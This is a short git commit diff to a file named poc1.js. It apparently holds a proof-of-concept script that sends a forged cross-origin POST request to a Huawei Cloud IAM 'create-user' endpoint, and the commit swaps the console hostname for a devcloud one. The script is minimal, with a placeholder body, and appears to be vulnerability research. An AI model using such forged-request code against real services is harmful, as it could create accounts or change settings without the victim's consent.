62712a0dc787ebc5c83d5513e8d32139d4b24c77
NT0-0 <31346815+NT0-0@users.noreply.github.com>
2019-09-30 15:59:42 +0800

    Update poc1.js

--- poc1.js
+++ poc1.js
@@ -1,5 +1,5 @@
 var xhr = new XMLHttpRequest();
-xhr.open("POST", 'https://console.huaweicloud.com/iam/server/create-user', true);
+xhr.open("POST", 'https://devcloud.huaweicloud.com/iam/server/create-user', true);
 xhr.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
 xhr.onload = function () {};
 xhr.send("foo=bar"); 
